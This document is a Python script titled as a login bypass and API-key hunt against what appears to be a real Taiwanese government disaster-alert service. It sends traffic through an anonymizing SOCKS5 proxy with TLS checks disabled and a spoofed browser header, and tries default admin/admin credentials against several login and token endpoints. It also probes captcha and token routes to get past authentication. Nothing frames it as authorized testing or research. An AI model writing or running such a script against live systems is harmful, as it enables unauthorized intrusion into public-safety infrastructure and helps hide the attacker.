#!/usr/bin/env python3
"""Phase 54: NCDR login bypass + find API key."""
import sys
sys.path.insert(0, '/usr/lib/python3/dist-packages')
import requests, urllib3, json
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = "https://alerts.ncdr.nat.gov.tw"
ADDED = "/AddValueApi"
PROXY = {'https': 'socks5://202.160.76.154:11085', 'http': 'socks5://202.160.76.154:11085'}
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Accept': 'application/json',
    'Content-Type': 'application/json',
    'Capapikey': 'test',
}

print("=== Login attempts ===")
login_urls = [
    f'{BASE}{ADDED}/v1/Auth/Session/login',
    f'{BASE}{ADDED}/v1/Auth/Session/eGovlogin',
]

# Try login with common credentials
for url in login_urls:
    # POST with JSON
    data = {'username': 'admin', 'password': 'admin'}
    r = requests.post(url, proxies=PROXY, verify=False, timeout=15,
                       headers=HEADERS, json=data)
    print(f"  POST {url} admin/admin: {r.status_code}, len={len(r.text)}")
    if r.status_code not in [404, 500]:
        try:
            print(f"    JSON: {r.json()}")
        except:
            print(f"    Body: {r.text[:300]}")

    data2 = {'account': 'admin', 'pwd': 'admin'}
    r2 = requests.post(url, proxies=PROXY, verify=False, timeout=15,
                        headers=HEADERS, json=data2)
    print(f"  POST {url} account/pwd: {r2.status_code}, len={len(r2.text)}")

    # POST with form data
    r3 = requests.post(url, proxies=PROXY, verify=False, timeout=15,
                        headers={**HEADERS, 'Content-Type': 'application/x-www-form-urlencoded'},
                        data={'username': 'admin', 'password': 'admin'})
    print(f"  POST form {url}: {r3.status_code}, len={len(r3.text)}")

# Try captcha endpoint (which is GET and might return JSON)
print("\n=== Captcha endpoint ===")
for url in [f'{BASE}{ADDED}/v1/Auth/Captcha', f'{BASE}{ADDED}/v1/auth/captcha']:
    r = requests.get(url, proxies=PROXY, verify=False, timeout=15, headers=HEADERS)
    print(f"  GET {url}: {r.status_code}, len={len(r.text)}, ct={r.headers.get('content-type','')}")
    if r.status_code == 200 and 'html' not in r.headers.get('content-type', ''):
        try:
            data = r.json()
            print(f"    JSON: {json.dumps(data, indent=2)[:800]}")
        except:
            print(f"    Body: {r.text[:300]}")

# Try Token endpoint with different data
print("\n=== Token endpoint ===")
for url in [f'{BASE}{ADDED}/v1/Auth/Session/Token', f'{BASE}{ADDED}/v1/Auth/Token']:
    for data in [{'username': 'admin', 'password': 'admin'}, {}, {'grant_type': 'client_credentials'}]:
        r = requests.post(url, proxies=PROXY, verify=False, timeout=15,
                           headers={**HEADERS, 'Content-Type': 'application/json'},
                           json=data)
        print(f"  POST {url} {data}: {r.status_code}, len={len(r.text)}")
        if r.status_code not in [404, 500]:
            try:
                print(f"    JSON: {r.json()}")
            except:
                print(f"    Body: {r.text[:300]}")
